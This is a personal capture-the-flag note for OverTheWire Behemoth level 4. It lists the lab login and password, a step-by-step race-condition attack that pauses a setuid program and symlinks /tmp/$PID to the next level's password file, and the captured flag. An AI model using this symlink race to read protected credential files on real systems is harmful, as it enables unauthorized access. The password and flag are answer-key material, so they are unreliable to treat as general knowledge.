---
tags:
  - ctf
  - "#behemoth_4"
  - "#hijack_execution_race_condition"
created: 2026-05-26
---

# `Level [4]` 
> 

## 🔐 Connection data

| Parameter | Value                         |
| --------- | ----------------------------- |
| Host      | behemoth.labs.overthewire.org |
| Port      | 2221                          |
| Login     | behemoth4                     |
| Password  | hpjUdlG723                    |

## 🎯 Task of the leves
- hijack file execution with race condition
## 🎯 Information

| Type of information | Data                                 |
| ------------------- | ------------------------------------ |
| attack type         | `hijack file execution`              |
| program work        | program try create file in /tmp/$PID |
| program work        | program try read created file        |

## 🎯 Tools

| Tool | Destination | Usage |
| ---- | ----------- | ----- |
|      |             |       |
## 📚 Key commands/technics

| Coomand | Desctiption |
| ------- | ----------- |
|         |             |
|         |             |
|         |             |

## 💡 Step by step

| Step | Action                                       | Information                                                 |
| ---- | -------------------------------------------- | ----------------------------------------------------------- |
| 1    | /behemoth/behemoth4&                         | start behemoth4 in bg                                       |
| 2    | PID=$!                                       | export to env PID from behemoth4 when it in bg              |
| 3    | kill -STOP $PID                              | stop behemoth4 when it run                                  |
| 4    | ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID | create symbolic link to behemoth5 password to /tmp with PID |
| 5    | kill -CONT $PID                              | continue behemoth4 work                                     |
| 6    | echo $PID                                    | write to terminal pid to read it after program work in tmp  |
| 7    |                                              | create bash script with all command before and start it     |

## 🔍 Result
Flag: mVfC4rBKZ4

## 🚪 Travel
-> [Behemoth_4]

## 🔗 Link
- [Название ресурса](URL)